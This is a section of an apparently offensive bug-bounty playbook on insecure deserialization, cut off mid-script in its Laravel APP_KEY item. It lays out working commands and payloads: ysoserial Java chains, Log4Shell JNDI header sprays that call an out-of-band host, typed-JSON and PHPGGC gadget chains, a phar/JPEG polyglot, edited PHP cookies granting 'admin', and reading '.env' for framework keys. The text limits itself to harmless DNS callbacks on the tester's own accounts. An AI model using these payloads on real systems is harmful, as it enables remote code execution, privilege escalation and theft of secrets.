# DSR · Insecure deserialization

> The server rebuilds objects from bytes you supply. With a usable gadget chain on the server that is code
> execution; without one it is still object injection or tampering with state the server trusted. A serialized
> blob in a cookie is not a finding. Proof is a callback from a gadget that has no side effect, the output of one
> harmless call, or an authorisation decision changed on our own accounts. Never a shell.

| | |
|---|---|
| **Class** | `deser` |
| **Applies when** | http, app\|api |
| **Pays** | 101 disclosed reports, 29 paid, median $1,000, top $10,000. The best-paid live-target reports got attacker bytes into a native deserializer (PHP `unserialize`, Json.NET `TypeNameHandling`, a JNDI login module, Ruby); most of the paid tail is PHP runtime memory bugs and CodeQL queries, not web findings. |
| **Weaknesses** | Deserialization of Untrusted Data · CWE-502 |

## Why it pays

Native serialization formats carry type names, and the deserializer instantiates whatever type the bytes name.
Where the bytes cross the trust boundary (a cookie, a hidden form field, an API parameter, an uploaded file, a
message queue) the attacker picks the classes. On a live target that pays at the top of the table: $10,000 for a
deserialization parameter on a media endpoint (#1312641), $3,000 for Json.NET type-name handling in an automation
builder (#3861550), $5,000 for a JNDI login module in a connector configuration (#1529790), $1,500 for code
execution on a package registry (#274990), $600 each for three `unserialize` sinks in one forum product (#407552,
#410237, #410882).

The second way in is the key. Frameworks protect client-held state with a MAC or encryption, and then
deserialize it without further checks. A leaked ASP.NET machineKey, Laravel `APP_KEY` or Rails `secret_key_base`
turns "the state is signed" into "the attacker signs the state". ViewState deserialization is in the list
(#1391576), and the disclosure of a `secret_key_base` paid $3,500 on its own (#460545).

Be honest about the rest of the table in `kb/reports/deser.md`: about a third of it is memory corruption in PHP's
`unserialize` paid by Internet Bug Bounty and static-analysis queries paid by GitHub Security Lab. Those are not
what a web hunt produces.

## The crux question

**Which bytes that I can change does the server turn back into objects, what protects them (nothing, a MAC,
encryption), and do I know the key?**

## Applicability probe

Settle `serialized` for the asset. The fingerprinter sets it true on a magic prefix and never sets it false, so a
negative needs this walk.

```bash
# 1. magic prefixes in everything recon captured (cookies, hidden fields, parameters, headers, bodies)
grep -rhoE '(rO0AB[A-Za-z0-9+/=_-]{8,}|AAEAAAD/////[A-Za-z0-9+/=]{4,}|/wE[A-Za-z0-9+/=]{12,}|(Tzo|YTo)[A-Za-z0-9+/=]{8,}|[OC]:[0-9]+:"[A-Za-z0-9_\\]+":[0-9]+:\{|a:[0-9]+:\{[is]:|BAh[A-Za-z0-9+/=_-]{6,}|gA[JNSW][A-Za-z0-9+/=_-]{8,}|eyJpdiI6[A-Za-z0-9+/=]{8,}|_\$\$ND_FUNC\$\$_|!!python/|!ruby/|"\$type" *:|"@class" *:|"@type" *:|"py/object" *:)' \
  "$E/recon/$H/" | cut -c1-70 | sort | uniq -c | sort -rn | head -30
# 2. state fields in forms
curl -sS "${HDR[@]}" $A "$T/" | grep -oiE 'name="(__VIEWSTATE|__VIEWSTATEGENERATOR|__EVENTVALIDATION|javax\.faces\.ViewState)"[^>]{0,80}'
# 3. content types that carry native objects
grep -rilE 'application/x-java-serialized-object|application/x-amf|application/(x-)?yaml|text/yaml' "$E/recon/$H/" | head
```

```text
raw bytes / base64 prefix            format
ac ed 00 05 / rO0AB                  Java ObjectOutputStream (H4sIA is gzip around it, or around anything else)
00 01 00 00 00 ff ff ff ff / AAEAAAD/////   .NET BinaryFormatter
ff 01 / /wE                          .NET LosFormatter, ObjectStateFormatter (__VIEWSTATE)
O:4:"User":2:{  a:2:{  C:  / Tzo YTo PHP serialize
80 02 .. 80 05 / gAJ gAN gAS gAW     Python pickle protocol 2 to 5; protocol 0 is text starting "(dp0" or "c"
04 08 / BAh BAg                      Ruby Marshal
!!python/object  !ruby/object:  !!javax.     YAML with a language tag
_$$ND_FUNC$$_                        node-serialize function marker
"$type"  "@class"  "@type"  "py/object"      typed JSON: Json.NET, Jackson default typing, fastjson, jsonpickle
eyJpdiI6 ({"iv":)                    Laravel encrypted cookie; serialized PHP may sit inside
```

```bash
scripts/sane fact set "$H" serialized=1 --ev "cookie prefs starts YTo (PHP array); hidden field __VIEWSTATE on /login.aspx"
scripts/sane fact set "$H" serialized=0 --ev "all cookies are opaque ids or JWTs; no state fields; APIs are plain JSON without type members"
```

DSR-004, DSR-006, DSR-008 and DSR-009 do not depend on `serialized`: their input is a JNDI string, a JSON type
member, a file path or a leaked key.

## Triage order

DSR-001 (which blobs are really deserialized: a handful of requests) → DSR-002 (unsigned state, no gadget needed)
→ DSR-005 (ViewState key check, offline) → DSR-009 (Laravel key check, offline) → DSR-003 (Java URLDNS) → DSR-007
(PHP) → DSR-006 (typed JSON) → DSR-010 (Python) → DSR-011 (Ruby) → DSR-004 (JNDI) → DSR-008 (phar).

## Items

### DSR-001 · A client-held serialized blob is deserialized by the server before any integrity check

| | |
|---|---|
| **Severity** | None standalone; the entry primitive that decides which later items apply |
| **Requires** | serialized |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #1312641, #876708, #142562 |

- **Where:** every value the applicability probe listed: cookies, hidden fields, query and body parameters,
  headers, WebSocket messages, import files. One row per value in `$E/evidence/$H/DSR-001/blobs.md`: name,
  encoding layers, format, protection.
- **Test:** decode the value and identify the format. Then send three variants and compare the errors: the
  original; the original with its last byte changed (a trailing MAC fails first if there is one); a valid object
  of a different, harmless type (the deserializer succeeds and the application's cast or lookup fails). An error
  that comes from the deserializer or from a type cast means attacker bytes were deserialized.
- **How:**
  ```bash
  python3 - "$VALUE" <<'PY'
  import base64, binascii, re, sys, urllib.parse, zlib
  v = urllib.parse.unquote(sys.argv[1]); cands = {'raw': v.encode('latin-1', 'ignore')}
  for name, f in (('b64', base64.b64decode), ('b64url', base64.urlsafe_b64decode)):
      try: cands[name] = f(v + '=' * (-len(v) % 4))
      except Exception: pass
  try: cands['hex'] = binascii.unhexlify(v)
  except Exception: pass
  for k, b in list(cands.items()):
      for wbits in (31, 15, -15):
          try: cands[k + '+inflate'] = zlib.decompress(b, wbits); break
          except Exception: pass
  sig = [(b'\xac\xed\x00\x05', 'Java'), (b'\x00\x01\x00\x00\x00\xff\xff\xff\xff', '.NET BinaryFormatter'),
         (b'\xff\x01', '.NET ViewState'), (b'\x04\x08', 'Ruby Marshal'), (b'\x80\x02', 'pickle 2'),
         (b'\x80\x03', 'pickle 3'), (b'\x80\x04\x95', 'pickle 4'), (b'\x80\x05\x95', 'pickle 5')]
  for k, b in cands.items():
      hit = [n for s, n in sig if b.startswith(s)]
      if re.match(rb'^[OC]:\d+:"|^a:\d+:\{|^s:\d+:"', b): hit.append('PHP serialize')
      if b'_$$ND_FUNC$$_' in b: hit.append('node-serialize')
      if re.search(rb'!!python/|!ruby/|!!java', b): hit.append('YAML language tag')
      if re.search(rb'"(\$type|@class|@type|py/object)"\s*:', b): hit.append('typed JSON')
      if b.startswith(b'{"iv":'): hit.append('Laravel encrypted envelope')
      if hit: print(k, hit, len(b), b[:60])
  PY
  ```
  Harmless objects of another type, to send in the original's encoding:
  ```text
  Java     rO0ABXQABmRzcjAwMQ==            the String "dsr001"; a ClassCastException names the class the code expected
  PHP      O:8:"stdClass":0:{}             or add one to a declared string length: "unserialize(): Error at offset N"
  Python   gAJYBgAAAGRzcjAwMXEALg==        pickle of the str "dsr001"
  Ruby     BAhJIgtkc3IwMDEGOgZFVA==        Marshal of the String "dsr001"
  ```
  ```bash
  TAMPERED=$(python3 -c "import sys,base64;v=sys.argv[1];b=bytearray(base64.b64decode(v+'='*(-len(v)%4)));b[-1]^=1;print(base64.b64encode(bytes(b)).decode())" "$VALUE")
  OTHER='rO0ABXQABmRzcjAwMQ=='        # the line of the table above that matches the format
  for v in "$VALUE" "$TAMPERED" "$OTHER"; do
    curl -sS "${HDR[@]}" $A -b "prefs=$v" "$T/account" -o "$E/evidence/$H/DSR-001/$(printf '%s' "$v" | md5sum | cut -c1-8).body" -w '%{http_code} %{size_download}\n'; done
  ```
- **Proof:** none for a report. The record is the three responses per blob and the classification: deserialized
  without protection, deserialized after a MAC check, or rejected.
- **Not a finding when:** every variant returns the same generic error or the same page (the value is ignored or
  compared as an opaque string); a signature error comes back before any parsing (protected: the key items DSR-005,
  DSR-009 and DSR-011 are the only way on); the format is data-only (JSON without type members, JWT, protobuf);
  a Java error says the stream was rejected by a filter (`filter status: REJECTED`).
- **Escalate:** by format: Java DSR-003, .NET DSR-005, PHP DSR-007, Python DSR-010, Ruby DSR-011, typed JSON
  DSR-006. Unprotected data without a native type system, or before trying gadgets: DSR-002. A `_$$ND_FUNC$$_`
  marker means the value is evaluated as JavaScript on load; prove it with a function body that only resolves a
  name, `_$$ND_FUNC$$_function(){require('dns').lookup('dsr001-node.OOB',function(){})}()`, and stop.

### DSR-002 · An unsigned serialized cookie or parameter holds authorisation or business state that the server trusts after we edit it

| | |
|---|---|
| **Severity** | High standalone when the edit yields another account's data or a higher role; Medium for business values (price, quota, feature flags); Low for a readable signed blob that holds something secret |
| **Requires** | serialized, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #202774, #496219, #1183335 |

- **Where:** blobs that DSR-001 classified as deserialized without protection, and signed-but-not-encrypted state
  whose content you can read: PHP arrays in cookies (`a:2:{s:7:"user_id";i:1001;s:4:"role";s:4:"user";}`),
  Java or .NET state objects that carry ids, prices or step counters of a multi-step flow, Flask and Rails signed
  cookies, base64 JSON `state` parameters.
- **Test:** no gadget chain is involved. Change one field the server should own and see whether the next
  response honours it. Use our own second identity as the target: put B's id where A's is.
- **How:**
  ```bash
  # PHP array in a cookie: decode, edit, keep the declared lengths right, re-encode the same way
  printf '%s' "$VALUE" | base64 -d; echo
  N=$(printf '%s' 'a:2:{s:7:"user_id";i:1002;s:4:"role";s:5:"admin";}' | base64 -w0)
  curl -sS "${HDR[@]}" -b "prefs=$N" "$T/account" -o "$E/evidence/$H/DSR-002/edited.body" -w '%{http_code}\n'
  # loose comparison: a boolean true equals any non-empty string under PHP ==
  N=$(printf '%s' 'a:2:{s:7:"user_id";i:1002;s:5:"token";b:1;}' | base64 -w0)
  # signed, readable state: read it, then test whether the signature is checked at all (edit payload, keep signature)
  flask-unsign --decode --cookie "$SESSION_COOKIE"
  ```
  For a signed blob also test binding: take the value issued to A and present it in B's session, and after A logs
  out. A signature that validates for anyone, forever, turns any state it carries into a bearer token.
- **Proof:** A's request with the edited blob returning B's data or performing an action reserved for a higher
  role, on our own accounts, with the original and edited values decoded side by side.
- **Not a finding when:** the edited field is ignored because the server derives the value from its own session;
  the change only alters what our own session displays; a signed cookie is readable but holds nothing secret
  (that is the design of signed cookies); ViewState is "not encrypted" with the MAC intact.
- **Escalate:** the same unprotected blob in a native format is the input for the gadget items. A signing secret
  that falls to a wordlist (`flask-unsign --unsign --cookie "$SESSION_COOKIE" --wordlist secrets.txt --no-literal-eval`,
  offline) is session forgery: AUT and JWT chapters.

### DSR-003 · A Java endpoint deserializes attacker bytes: a URLDNS payload makes the server resolve our host name

| | |
|---|---|
| **Severity** | High standalone with the URLDNS lookup; Critical when one gadget chain runs a single harmless command |
| **Requires** | serialized, java, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #221294, #153026, #728614, #1167773 |

- **Where:** `rO0AB` or `H4sIA` values in cookies, parameters and hidden fields (including an unencrypted JSF
  `javax.faces.ViewState`); request bodies with `Content-Type: application/x-java-serialized-object`; invoker
  endpoints such as `/invoker/JMXInvokerServlet` and `/invoker/EJBInvokerServlet`; AMF endpoints
  (`/messagebroker/amf`).
- **Test:** the URLDNS payload is a `HashMap` holding a `java.net.URL`. Deserializing it calls `URL.hashCode()`,
  which resolves the host name. It needs no library on the classpath, works on every JRE and executes nothing, so
  it answers "are my bytes deserialized" without risk.
- **How:**
  ```bash
  # Java 9 and later need the --add-opens flags; remove them on Java 8
  YSO="java --add-opens java.base/java.net=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar"
  $YSO URLDNS "http://dsr003-cookie.$OOB" > urldns.bin
  # wrap exactly as the original value was wrapped (base64, URL-safe base64, gzip then base64)
  P=$(base64 -w0 urldns.bin | python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))')
  curl -sS "${HDR[@]}" $A -b "state=$P" "$T/home" -o /dev/null -w '%{http_code}\n'
  # raw-body endpoints
  $YSO URLDNS "http://dsr003-invoker.$OOB" > urldns2.bin
  curl -sS "${HDR[@]}" -X POST "$T/invoker/JMXInvokerServlet" -H 'Content-Type: application/x-java-serialized-object' --data-binary @urldns2.bin -o /dev/null -w '%{http_code}\n'
  # control: the bare host name as a plain string in the same place must NOT be resolved
  curl -sS "${HDR[@]}" $A -b "state=dsr003-control.$OOB" "$T/home" -o /dev/null
  ```
  The JVM caches the lookup, so use a new label for every attempt and one label per injection point. If the policy
  asks for execution proof, build one chain for a library the error pages or dependencies show (for example
  `$YSO CommonsCollections6 "nslookup dsr003-rce.$OOB"`), send it once, and stop. No file writes, no reverse
  connection, no second command.
- **Proof:** the DNS query for the unique label, timestamped just after the request, with no query for the control
  label. For the execution step, the query for the second label. Save the payload file and the raw request.
- **Not a finding when:** the control label is also resolved (a WAF, log pipeline or scanner resolves any host
  name it sees); the lookup arrives but every gadget class is refused by a deserialization filter (JEP 290
  allow-list: `HashMap` and `URL` pass, nothing useful does), which programmes rate low or informative; the value
  is encrypted or signed and your modified copy is rejected before deserialization.
- **Escalate:** other Java formats have the same kind of side-effect-free probe. SnakeYAML:
  `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://dsr003-yaml.OOB/"]]]]`
  makes the server request `/META-INF/services/javax.script.ScriptEngineFactory` from our host; serve nothing and
  the request alone is the proof (#1167773, #1807214). Product-specific endpoints (JBoss, WebLogic, Jenkins,
  Telerik) are in the CVE chapter. A gadget that performs a lookup leads to DSR-004.

### DSR-004 · A string from the request reaches a JNDI lookup and the server connects to the directory host we name

| | |
|---|---|
| **Severity** | High standalone with the inbound lookup from the target; Critical when the programme accepts that as code execution (old JDK or Log4Shell) |
| **Requires** | java, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #1529790, #1425474, #1427589, #1430622 |

- **Where:** three places. Fields that are JNDI names or connection strings by design: data-source names, LDAP,
  JMS and JMX URLs, JAAS configuration in connector or integration settings (#1529790). Logged input on a Log4j 2
  version before 2.15: headers, user names, search terms. Lookup gadgets reached through DSR-003 or DSR-006.
- **Test:** a JNDI lookup opens a connection to the server named in the string and deserializes or loads what
  that server returns. The inbound connection proves the lookup. We never return an object: do not run a referral
  server (marshalsec, rogue-jndi, JNDIExploit).
- **How:**
  ```bash
  nc -lvnp 1389          # on the callback host: shows the LDAP bind bytes, answers nothing
  # a field that takes a JNDI name or URL
  curl -sS "${HDR[@]}" $A -X POST "$T/api/datasources" -H 'Content-Type: application/json' \
    -d "{\"name\":\"dsr004\",\"jndiName\":\"ldap://dsr004-field.$OOB:1389/a\"}" -o /dev/null -w '%{http_code}\n'
  # logged headers and parameters: ${hostName} is expanded by Log4j itself, so it appears in the DNS query only if Log4j evaluated the string
  for h in X-Forwarded-For X-Api-Version Referer X-Request-Id; do
    l=$(printf '%s' "$h" | tr 'A-Z' 'a-z' | tr -cd 'a-z0-9')
    curl -sS "${HDR[@]}" "$T/" -H "$h: \${jndi:ldap://\${hostName}.dsr004-$l.$OOB:1389/a}" -o /dev/null -w "%{http_code} $h\n"; sleep 1; done
  curl -sS "${HDR[@]}" --get --data-urlencode "q=\${jndi:ldap://\${hostName}.dsr004-q.$OOB:1389/a}" "$T/search" -o /dev/null
  ```
- **Proof:** the DNS query whose first label is the target's own host name (the nested lookup was evaluated inside
  the target JVM), or the TCP connection to port 1389 from the target's address range, tied to the request by the
  per-position label.
- **Not a finding when:** the query arrives from a third party's network minutes or hours later (a log-analysis or
  security vendor processed the line: `third-party`); the label arrives without an expanded host name in front
  and from a resolver that also resolves plain host names in headers; the field validates the scheme and only
  `java:comp/env` names are accepted. Header spraying for Log4Shell is years old: expect `dup-risk` and a
  `known-cve` exclusion.
- **Escalate:** nothing further is needed for the report. State the JDK version if an error page or header shows
  it: remote class loading over LDAP works before 8u191; later versions need a local gadget, which is DSR-003 by
  another route. JDBC URL fields next to JNDI fields have their own tricks: CVE and RCE chapters.

### DSR-005 · `__VIEWSTATE` is accepted without a valid MAC, or its MAC validates under a machineKey we know

| | |
|---|---|
| **Severity** | Critical standalone with one harmless command executed; High with the key identified offline only |
| **Requires** | dotnet, serialized |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #1391576, #3090123, #496219 |

- **Where:** ASP.NET Web Forms pages (`.aspx`) that post `__VIEWSTATE`. The same machineKey protects
  `__EVENTVALIDATION`, forms-authentication tickets and `ScriptResource.axd` parameters. Keys become known three
  ways: a product or tutorial shipped a fixed one, the repository or a backup of `web.config` is public, or
  another finding reads `web.config` (XXE-001, LFI).
- **Test:** ViewState is an `ObjectStateFormatter` stream, deserialized on every postback. The MAC is the only
  thing between the request and the deserializer. Answer two questions, the first one offline: does the MAC of a
  ViewState the server issued validate under a known key, and does the server check the MAC at all.
- **How:**
  ```bash
  curl -sS "${HDR[@]}" "$T/login.aspx" -o page.html
  VS=$(grep -oP 'id="__VIEWSTATE" value="\K[^"]+' page.html); GEN=$(grep -oP 'id="__VIEWSTATEGENERATOR" value="\K[^"]+' page.html)
  # 1. known-key check, offline, no request to the target
  badsecrets "$VS" "$GEN"
  # 2. is the MAC checked? change the last byte and post it back
  BAD=$(python3 -c "import sys,base64;b=bytearray(base64.b64decode(sys.argv[1]));b[-1]^=1;print(base64.b64encode(bytes(b)).decode())" "$VS")
  curl -sS "${HDR[@]}" -X POST "$T/login.aspx" --data-urlencode "__VIEWSTATE=$BAD" --data-urlencode "__VIEWSTATEGENERATOR=$GEN" -o bad.html -w '%{http_code}\n'
  grep -ciE 'validation of viewstate mac failed|state information is invalid' bad.html
  ```
  With a key (or with the MAC unchecked), and only if the policy asks for execution proof, generate one payload
  with ysoserial.net on a Windows lab machine and post it as `__VIEWSTATE` to the same page:
  ```text
  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "nslookup dsr005.OOB" --generator=<__VIEWSTATEGENERATOR> --validationalg="SHA1" --validationkey="<validationKey>"
  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "nslookup dsr005.OOB" --path="/login.aspx" --apppath="/" --validationalg="HMACSHA256" --validationkey="<validationKey>" --decryptionalg="AES" --decryptionkey="<decryptionKey>"
  ```
- **Proof:** the `badsecrets` output naming the key and where it is published, next to the ViewState it validated:
  that alone shows anyone can forge state for this application. For the execution step, the DNS query from the
  single `nslookup`.
- **Not a finding when:** the tampered ViewState is refused with a MAC error and no known key matches: the control
  holds. "ViewState is not encrypted" is not a finding. MAC checking cannot be switched off on a patched .NET
  4.5.2 or later, so a page that tolerates a modified ViewState on a modern stack usually ignores it for that
  request; confirm with a structurally valid edit before claiming the MAC is off.
- **Escalate:** the machineKey also signs forms-authentication tickets: forging `.ASPXAUTH` for our second account
  is an authentication bypass with no code execution involved (AUT chapter). Report where the key came from as
  its own disclosure finding (INF).

### DSR-006 · A JSON body with a type member (`$type`, `@class`, `@type`) makes the server instantiate a class we name

| | |
|---|---|
| **Severity** | High standalone with a type-resolution proof and a DNS lookup; Critical when one gadget runs a single harmless command |
| **Requires** | api, dotnet\|java, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #3861550, #1287573, #1368720, #1319270 |

- **Where:** JSON APIs whose responses contain `"$type"`, `"$values"`, `"@class"` or arrays of the form
  `["java.util.ArrayList",[...]]`: the serializer is configured for polymorphism and usually reads it too. Aim at
  free-form members typed `object` or `Map<String,Object>` on the server: `metadata`, `settings`, `payload`,
  workflow and automation definitions (#3861550).
- **Test:** Json.NET with `TypeNameHandling` other than `None`, Jackson with default typing or
  `@JsonTypeInfo(use = Id.CLASS)`, and fastjson with autoType resolve the class named in the JSON and set its
  properties. First show that the resolver runs (a type that does not exist gives a load error). Then name a type
  whose construction only performs a DNS lookup.
- **How:**
  ```bash
  U="$T/api/v1/automations"; J='Content-Type: application/json'
  # 1. resolver differential: each line against the same request without the type member
  curl -sS "${HDR[@]}" $A -X POST "$U" -H "$J" -d '{"name":"dsr006","config":{"$type":"Dsr006.NoSuchType, Dsr006NoSuchAssembly"}}' | head -c 400; echo
  curl -sS "${HDR[@]}" $A -X POST "$U" -H "$J" -d '{"name":"dsr006","config":{"$type":"System.Version, mscorlib","Major":1}}' | head -c 400; echo
  curl -sS "${HDR[@]}" $A -X POST "$U" -H "$J" -d '{"name":"dsr006","config":{"@class":"dsr006.NoSuchClass"}}' | head -c 400; echo
  curl -sS "${HDR[@]}" $A -X POST "$U" -H "$J" -d '{"name":"dsr006","config":{"@type":"dsr006.NoSuchClass"}}' | head -c 400; echo
  # 2. lookup-only types on Java
  curl -sS "${HDR[@]}" $A -X POST "$U" -H "$J" -d "{\"name\":\"dsr006\",\"config\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"dsr006-fastjson.$OOB\"}}" -o /dev/null
  curl -sS "${HDR[@]}" $A -X POST "$U" -H "$J" -d "{\"name\":\"dsr006\",\"config\":[\"java.net.InetAddress\",\"dsr006-jackson.$OOB\"]}" -o /dev/null
  ```
  Resolver messages: Json.NET `Could not load assembly 'Dsr006NoSuchAssembly'` or `Error resolving type specified
  in JSON`, and for the second line `is not compatible with` (the type was loaded and then refused for that
  member); Jackson `Could not resolve type id 'dsr006.NoSuchClass'`; fastjson `autoType is not support`. On .NET
  there is no lookup-only type worth trusting: if the policy asks for execution proof send one payload from
  `ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "nslookup dsr006-net.OOB"` and stop.
- **Proof:** the pair of responses showing that a class name from the request is resolved, plus the DNS query for
  the Java label or the single `nslookup` query on .NET.
- **Not a finding when:** the type member is ignored and the response equals the baseline (`TypeNameHandling.None`,
  no default typing); the error says the type is not allowed (a `SerializationBinder`, Jackson's
  `PolymorphicTypeValidator`, fastjson safe mode); `$type` appears only in output while input ignores it.
- **Escalate:** on Java the next gadget is usually a lookup class (`JdbcRowSetImpl` and its relatives), which is
  DSR-004: prove the inbound connection and stop. A typed member that is stored and deserialized later by a worker
  or an admin view is the same finding with a different trigger: say when it fires.

### DSR-007 · A PHP `unserialize()` call receives our object and a gadget chain from the installed libraries calls a function we choose

| | |
|---|---|
| **Severity** | Critical standalone with a function call proven by DNS lookup; Medium for object injection with an application-level effect and no chain |
| **Requires** | php, serialized, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #1312641, #407552, #210741, #1820492 |

- **Where:** PHP serialized values that DSR-001 found unprotected (plain `a:` or `O:`, or base64 `YTo` and `Tzo`),
  in cookies, hidden fields and API parameters. Also values you can store that the application later passes to
  `unserialize` or WordPress `maybe_unserialize`: profile metadata, import files, cached settings.
- **Test:** PHP calls `__wakeup` and `__destruct` on whatever class the string names, and a chain of such methods
  in the installed libraries ends in a function call. Identify the framework first (cookie names, error pages,
  `/vendor/` paths), then use a PHPGGC chain of type "RCE: Function Call" with a function that has no side effect.
- **How:**
  ```bash
  # 1. is an arbitrary class instantiated? a class that exists everywhere against one that cannot exist
  for o in 'O:8:"stdClass":0:{}' 'O:9:"Dsr007Nop":0:{}'; do
    curl -sS "${HDR[@]}" $A -b "prefs=$(printf '%s' "$o" | base64 -w0)" "$T/" -o /dev/null -w "%{http_code} %{size_download} $o\n"; done
  # 2. pick a chain for the framework and read what it does before using it
  phpggc -l | grep -iE 'laravel|symfony|monolog|guzzle|wordpress|yii|codeigniter|drupal|magento|doctrine|slim|thinkphp'
  phpggc -i Monolog/RCE1
  # 3. function-call chain with a harmless function: one DNS lookup, nothing written, nothing spawned
  phpggc -f -b Monolog/RCE1 gethostbyname "dsr007-prefs.$OOB" > p.b64      # -b base64, -u URL-encode, -j JSON string, -f fast destruct
  curl -sS "${HDR[@]}" $A -b "prefs=$(cat p.b64)" "$T/" -o /dev/null -w '%{http_code}\n'
  ```
  Only chains typed "RCE: Function Call" or "File read" are used. Never a file-write, file-delete or include
  chain. A command chain is acceptable only as `nslookup dsr007-cmd.$OOB`, once, when the policy asks for it.
- **Proof:** the DNS query for the label after the request with the chain, none after the same request with the
  original value, and the chain name with the library version it targets.
- **Not a finding when:** both step 1 objects behave like the baseline (`allowed_classes` is false, or the value
  is never unserialized); objects are instantiated but no chain matches the installed versions and no property of
  an application class changes behaviour: that is "object injection without a gadget", parked or low. An
  `Error at offset` message means your string lengths are wrong, not that a control exists.
- **Escalate:** with source available (open-source CMS, leaked `vendor/`), look for application classes whose
  `__destruct`, `__wakeup` or `__toString` use a property in a query, a path or a comparison: injected properties
  reach SQL (#202774) or a custom chain (#1820492). A sink that takes a path instead of a string is DSR-008.

### DSR-008 · A file function reached with a `phar://` path deserializes the metadata of a file we uploaded

| | |
|---|---|
| **Severity** | Critical standalone with a function call proven by DNS lookup |
| **Requires** | php, upload, file-param\|url-fetch, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #410237, #410882, #403083, #1063039 |

- **Where:** PHP before 8.0. Parameters that reach `file_exists`, `is_file`, `filesize`, `fopen`,
  `file_get_contents`, `getimagesize`, `md5_file` or `copy`: image path and image URL fields, import-from-path and
  CSV importers (#403083), "check this URL" features, log or export path settings (#1063039). You also need the
  server-side path of a file you uploaded.
- **Test:** opening `phar://path/to/file` with any file function unserializes the archive's metadata. A phar is
  recognised by its content, so it can carry an image extension and be a valid JPEG at the same time.
- **How:**
  ```bash
  # build a JPEG/phar polyglot whose metadata is a function-call chain with a harmless function
  php -d phar.readonly=0 "$(command -v phpggc)" -p phar -pj clean.jpg -o dsr008.jpg Monolog/RCE1 gethostbyname "dsr008.$OOB"
  curl -sS "${HDR[@]}" $A -F "file=@dsr008.jpg;type=image/jpeg" "$T/api/upload" -o up.json; cat up.json     # note the stored path
  # the stored file must be byte-identical, otherwise the metadata is gone
  curl -sS "${HDR[@]}" $A "$T/uploads/dsr008.jpg" | cmp - dsr008.jpg && echo stored-unchanged
  # make a file function open it through the wrapper; relative and absolute forms of the stored path
  for p in "phar://./uploads/dsr008.jpg/x" "phar://../uploads/dsr008.jpg/x" "phar:///var/www/html/uploads/dsr008.jpg/x"; do
    curl -sS "${HDR[@]}" $A --get --data-urlencode "path=$p" "$T/api/image/info" -o /dev/null -w "%{http_code} $p\n"; sleep 1; done
  ```
  When `phar://` at the start of the value is filtered, wrap it: `compress.zlib://phar://./uploads/dsr008.jpg/x`
  or `php://filter/resource=phar://./uploads/dsr008.jpg/x`.
- **Proof:** the DNS query after the `phar://` request and none after the upload alone, with the polyglot file,
  the upload request and the triggering request.
- **Not a finding when:** the target runs PHP 8.0 or later (metadata is no longer unserialized by file functions);
  the upload was re-encoded or stored in object storage the file function cannot open; the parameter only accepts
  `http://` and `https://`; the path of the stored file cannot be learned.
- **Escalate:** nothing destructive: one of the disclosed reports reached file deletion through this route
  (#921288) and that is not a proof to repeat. An XML parser on the same host that accepts `phar://` in a system
  identifier is a second trigger (XXE-001).

### DSR-009 · A leaked Laravel `APP_KEY` decrypts our own cookie and lets us forge values the application unserializes

| | |
|---|---|
| **Severity** | Critical standalone when a forged cookie triggers a function call; High with the key shown to be the live one |
| **Requires** | php |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #401098, #2765259 |

- **Where:** Laravel applications: cookies `laravel_session` and `XSRF-TOKEN` whose value starts `eyJpdiI6`. The
  item needs the key, and `_facts.json` has no fact for "a framework secret is known", so it is gated on `php`
  and starts with a two-request check. Other key sources: a debug error page, the repository history, the default
  key of an open-source product built on Laravel, a file read from XXE-001 or the LFI chapter. With no key source
  the item is negative.
- **Test:** the key encrypts and authenticates everything the framework hands to the client. Decrypting our own
  cookie offline proves the key is the live one. What the plaintext looks like decides the next step: old versions
  (up to 5.5.40 and 5.6.29) serialize every cookie value and unserialize it on the way back, and any version does
  so for the session payload when the session driver is `cookie`.
- **How:**
  ```bash
  curl -sS "${HDR[@]}" "$T/.env" | grep -a '^APP_KEY='
  curl -sS "${HDR[@]}" -c jar.txt "$T/" -o /dev/null; grep -E 'laravel_session|XSRF-TOKEN' jar.txt
  cat > laravel_cookie.py <<'PY'
  import base64, hashlib, hmac, json, os, sys, urllib.parse
  from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
  key = os.environ['APP_KEY']; key = base64.b64decode(key[7:]) if key.startswith('base64:') else key.encode()
  def dec(cookie):
      env = json.loads(base64.b64decode(urllib.parse.unquote(cookie)))
      mac = hmac.new(key, (env['iv'] + env['value']).encode(), hashlib.sha256).hexdigest()
      d = Cipher(algorithms.AES(key), modes.CBC(base64.b64decode(env['iv']))).decryptor()
      pt = d.update(base64.b64decode(env['value'])) + d.finalize()
      return hmac.compare_digest(mac, env.get('mac', '')), pt[:-pt[-1]]
  def enc(pt):
      iv = os.urandom(16); pad = 16 - len(pt) % 16
      e = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
      iv64 = base64.b64encode(iv).decode(); v64 = base64.b64encode(e.update(pt + bytes([pad]) * pad) + e.finalize()).decode()
